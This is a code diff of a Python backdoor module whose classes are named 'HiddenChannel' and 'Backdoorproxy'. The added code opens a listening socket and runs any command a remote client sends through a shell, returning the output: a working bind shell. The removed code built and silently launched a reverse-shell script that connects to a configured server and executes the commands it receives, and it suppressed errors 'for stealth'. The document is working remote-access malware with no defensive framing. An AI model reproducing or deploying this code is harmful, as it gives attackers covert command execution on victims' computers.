@@ -13,13 +13,10 @@ sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 from configuration import SERVER_IP, SERVER_PORT, PROXY_PORT_START, PROXY_PORT_END
 
 class HiddenChannel:
-    """Hidden proxy channel for covert backdoor access"""
+    """Simple independent backdoor proxy - no external server needed"""
 
-    def __init__(self, listen_port=None, target_host=SERVER_IP, target_port=SERVER_PORT):
-        # Port will be set during initialization to ensure availability
-        self.listen_port = listen_port  # Don't generate random port yet
-        self.target_host = target_host
-        self.target_port = target_port
+    def __init__(self, listen_port=None):
+        self.listen_port = listen_port  # Will be set to random port
         self.is_running = False
         self.channel_socket = None
         self.channel_thread = None
@@ -45,103 +42,96 @@ class HiddenChannel:
             return None
     
     def handle_client_connection(self, client_socket, client_address):
-        """Handle individual client connection by spawning new backdoor process"""
+        """Handle client connection directly - execute commands locally"""
         connection_id = f"conn_{self.connection_count}"
         self.connection_count += 1
         
-        print(f"[PROXY] Client {connection_id} connected: {client_address}")
+        print(f"[PROXY] Client connected: {client_address}")
         
         try:
-            # Send welcome message
-            welcome_msg = f"[PROXY] Finding available proxy port...\n"
-            client_socket.send(welcome_msg.encode())
-            
-            # Find available proxy port
-            proxy_port = self.get_available_proxy_port()
-            
-            if not proxy_port:
-                error_msg = "No available proxy ports on server. Try again later.\n"
-                client_socket.send(error_msg.encode())
-                return
-            
-            client_socket.send(f"[PROXY] Using proxy port {proxy_port}\n".encode())
-            client_socket.send(f"[PROXY] Spawning dedicated backdoor instance...\n".encode())
-            
-            # Spawn new backdoor process for this client
-            result = self.spawn_backdoor_process_for_port(proxy_port)
-            
-            if not result or not result[0]:
-                error_msg = "Failed to spawn backdoor process. Try again.\n"
-                client_socket.send(error_msg.encode())
-                return
-            
-            backdoor_process, temp_file = result
-            
-            # Give user instructions
-            instructions = (
-                f"[PROXY] Backdoor instance spawned (PID: {backdoor_process.pid})\n"
-                f"[PROXY] Connected to server port {proxy_port}\n"
-                f"[PROXY] You now have your own private backdoor session!\n"
-                f"[PROXY] This connection will stay active until you disconnect\n"
-                f"[PROXY] Connection established!\n"
-            )
-            client_socket.send(instructions.encode())
-            
             # Store connection info
             self.connections[connection_id] = {
                 'client_addr': client_address,
                 'start_time': datetime.now(),
-                'proxy_port': proxy_port,
-                'process_pid': backdoor_process.pid,
-                'backdoor_process': backdoor_process,
-                'temp_file': temp_file
+                'commands_executed': 0
             }
             
-            # Keep connection alive and wait for process to finish
-            try:
-                while backdoor_process.poll() is None:  # While process is running
-                    time.sleep(1)
+            # Handle client commands directly
+            while True:
+                try:
+                    # Receive command from client
+                    data = client_socket.recv(4096)
+                    if not data:
+                        break
                     
-                # Process finished
-                final_msg = f"[PROXY] Backdoor process {backdoor_process.pid} has ended\n"
-                client_socket.send(final_msg.encode())
-                
-            except Exception:
-                # Client disconnected
-                if backdoor_process.poll() is None:  # If process still running
-                    backdoor_process.terminate()  # Clean up
-                    
-            # Clean up temp file
-            try:
-                if temp_file and os.path.exists(temp_file):
-                    os.remove(temp_file)
-            except Exception:
-                pass
+                    # Parse JSON command
+                    try:
+                        command = data.decode().strip()
+                        
+                        # Remove JSON quotes if present
+                        if command.startswith('"') and command.endswith('"'):
+                            command = command[1:-1]
+                        
+                        print(f"[PROXY] Executing command: {command}")
+                        
+                        # Execute command directly on Windows
+                        if command.lower() == 'quit' or command.lower() == 'exit':
+                            response = "Goodbye!"
+                            client_socket.send(response.encode())
+                            break
+                        else:
+                            # Execute the command
+                            try:
+                                result = subprocess.run(
+                                    command,
+                                    shell=True,
+                                    capture_output=True,
+                                    text=True,
+                                    timeout=30
+                                )
+                                
+                                # Get output
+                                output = result.stdout + result.stderr
+                                
+                                if output.strip():
+                                    response = output.strip()
+                                else:
+                                    response = "Command executed successfully (no output)"
+                                    
+                                # Update connection stats
+                                self.connections[connection_id]['commands_executed'] += 1
+                                
+                            except subprocess.TimeoutExpired:
+                                response = "Command timed out after 30 seconds"
+                            except Exception as e:
+                                response = f"Command execution error: {str(e)}"
+                        
+                        # Send response back to client
+                        client_socket.send(response.encode())
+                        print(f"[PROXY] Response sent ({len(response)} bytes)")
+                        
+                    except Exception as e:
+                        error_response = f"Error processing command: {str(e)}"
+                        client_socket.send(error_response.encode())
+                        print(f"[PROXY] Command error: {e}")
+                        
+                except Exception as e:
+                    print(f"[PROXY] Connection error: {e}")
+                    break
             
-        except Exception:
-            pass  # Silent failure for stealth
+        except Exception as e:
+            print(f"[PROXY] Client error: {e}")
         finally:
-            # Clean up sockets properly
-            try:
-                client_socket.shutdown(socket.SHUT_RDWR)
-            except:
-                pass
+            # Clean up client socket
             try:
                 client_socket.close()
             except:
                 pass
             if connection_id in self.connections:
                 del self.connections[connection_id]
-            print(f"[PROXY] Client {connection_id} disconnected")
+            print(f"[PROXY] Client disconnected: {client_address}")
     
-    def simple_forward(self, client_socket, target_socket, connection_id):
-        """Legacy method - no longer used in new architecture"""
-        pass
-
-    
-    def forward_data(self, source_socket, destination_socket, connection_id, direction):
-        """This method is no longer used - kept for compatibility"""
-        pass
+    # Removed complex forwarding - now handling commands directly
     
     def proxy_server_loop(self):
         """Main proxy server loop"""
@@ -187,9 +177,7 @@ class HiddenChannel:
         if self.is_running:
             return False, "proxy channel already running"
         
-        # Test if target is reachable
-        if not self.test_target_connection():
-            return False, f"Cannot reach target {self.target_host}:{self.target_port}"
+        # No external target needed - we handle commands locally
         
         # Start proxy channel in background thread
         self.channel_thread = threading.Thread(target=self.proxy_server_loop, daemon=True)
@@ -223,126 +211,13 @@ class HiddenChannel:
         
         return True, f"proxy channel stopped"
     
-    def get_available_proxy_port(self):
-        """Find an available proxy port by testing server ports"""
-        for port in range(PROXY_PORT_START, PROXY_PORT_END + 1):
-            try:
-                # Test if this proxy port is available on the server
-                test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                test_socket.settimeout(2)
-                result = test_socket.connect_ex((self.target_host, port))
-                test_socket.close()
-                
-                if result == 0:  # Connection successful = server listening
-                    return port
-                    
-            except Exception:
-                continue
-        
-        return None
-
-    def spawn_backdoor_process_for_port(self, proxy_port):
-        """Spawn a new backdoor process that connects to specific proxy port"""
-        try:
-            # Get the path to backdoor.py (should be in parent directory)
-            current_dir = os.path.dirname(os.path.abspath(__file__))
-            parent_dir = os.path.dirname(current_dir)
-            backdoor_path = os.path.join(parent_dir, 'backdoor.py')
-            
-            if not os.path.exists(backdoor_path):
-                print(f"[PROXY] Backdoor not found at: {backdoor_path}")
-                return None
-            
-            # Create custom backdoor script that connects to specific port
-            custom_backdoor_content = f'''
-import socket
-import json
-import subprocess
-import os
-import time
-
-SERVER_IP = '{self.target_host}'
-SERVER_PORT = {proxy_port}
-
-def reliable_send(data, sock):
-    jsondata = json.dumps(data)
-    sock.send(jsondata.encode())
-
-def reliable_recv(sock):
-    data = ''
-    while True:
-        try:
-            data = data + sock.recv(1024).decode().rstrip()
-            return json.loads(data)
-        except ValueError:
-            continue
-
-def shell(sock):
-    while True:
-        command = reliable_recv(sock)
-        
-        if command == 'quit':
-            break
-        else:
-            try:
-                execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-                result = execute.stdout.read() + execute.stderr.read()
-                result = result.decode('utf-8', errors='ignore')
-                if result:
-                    reliable_send(result, sock)
-                else:
-                    reliable_send("Command executed successfully (no output)", sock)
-            except Exception as e:
-                reliable_send("Command execution error: " + str(e), sock)
-
-# Connect to specific proxy port
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-try:
-    s.connect((SERVER_IP, SERVER_PORT))
-    shell(s)
-except Exception as e:
-    pass
-finally:
-    s.close()
-'''
-            
-            # Write custom backdoor to temp file
-            temp_backdoor_path = os.path.join(parent_dir, f'temp_backdoor_{proxy_port}.py')
-            with open(temp_backdoor_path, 'w') as f:
-                f.write(custom_backdoor_content)
-            
-            # Spawn new Python process running custom backdoor
-            process = subprocess.Popen(
-                [sys.executable, temp_backdoor_path],
-                cwd=parent_dir,
-                creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
-            )
-            
-            print(f"[PROXY] Spawned backdoor process PID: {process.pid} for port {proxy_port}")
-            return process, temp_backdoor_path
-            
-        except Exception as e:
-            print(f"[PROXY] Error spawning backdoor: {e}")
-            return None, None
-
-    def test_target_connection(self):
-        """Test if target server is reachable"""
-        try:
-            test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            test_socket.settimeout(2)
-            result = test_socket.connect_ex((self.target_host, self.target_port))
-            test_socket.close()
-            return result == 0
-        except:
-            return False
+    # No external target connection needed in simple approach
     
     def get_proxy_status(self):
         """Get current proxy status and statistics"""
         status = {
             'is_running': self.is_running,
             'listen_port': self.listen_port,
-            'target_host': self.target_host,
-            'target_port': self.target_port,
             'start_time': self.start_time.isoformat() if self.start_time else None,
             'active_connections': len(self.connections),
             'total_connections': self.connection_count,
@@ -425,15 +300,14 @@ class proxyManager:
 class Backdoorproxy:
     """Main manager for backdoor proxy operations"""
     
-    def __init__(self, target_host=SERVER_IP, target_port=SERVER_PORT):
-        self.target_host = target_host
-        self.target_port = target_port
+    def __init__(self):
+        # Simple approach - no external target needed
         self.channel = None
         self.proxy_mgr = None
     
     def initialize_proxy(self, listen_port=None):
         """Initialize the proxy channel"""
-        self.channel = HiddenChannel(listen_port, self.target_host, self.target_port)
+        self.channel = HiddenChannel(listen_port)
         self.proxy_mgr = proxyManager(self.channel)
         
         # Find available port if none specified
@@ -487,7 +361,6 @@ class Backdoorproxy:
         status = {
             'proxy': channel_status,
             'port_status': port_msg,
-            'target_reachable': self.channel.test_target_connection(),
             'system_time': datetime.now().isoformat()
         }
         
@@ -497,6 +370,47 @@ class Backdoorproxy:
 
 
 # Factory function to create backdoor proxy manager
-def create_backdoor_proxy(target_host=SERVER_IP, target_port=SERVER_PORT):
+def create_backdoor_proxy():
     """Create backdoor proxy manager instance"""
-    return Backdoorproxy(target_host, target_port)
+    return Backdoorproxy()
+
+
+# Test the proxy functionality
+if __name__ == "__main__":
+    print("Testing Backdoor proxy System...")
+    
+    # Create proxy manager
+    persist_mgr = create_backdoor_proxy()
+    
+    # Initialize proxy
+    success, msg = persist_mgr.initialize_proxy()
+    print(f"Initialize: {msg}")
+    
+    if success:
+        # Get initial status
+        status = persist_mgr.get_proxy_status()
+        print(f"\nInitial Status:")
+        print(f"  proxy Port: {status['proxy']['listen_port']}")
+        print(f"  Port Available: {status['port_status']}")
+        print(f"  Mode: Direct command execution")
+        
+        # Test starting the proxy
+        print(f"\nTesting proxy start...")
+        success, msg = persist_mgr.start_proxy_operations()
+        print(f"Start result: {msg}")
+        
+        if success:
+            # Show running status
+            time.sleep(1)
+            status = persist_mgr.get_proxy_status()
+            print(f"\nRunning Status:")
+            print(f"  Is Running: {status['proxy']['is_running']}")
+            print(f"  Uptime: {status['proxy']['uptime_seconds']:.1f} seconds")
+            print(f"  Active Connections: {status['proxy']['active_connections']}")
+            
+            # Test stopping
+            time.sleep(2)
+            success, msg = persist_mgr.stop_proxy_operations()
+            print(f"\nStop result: {msg}")
+    
+    print("\nproxy test completed!")
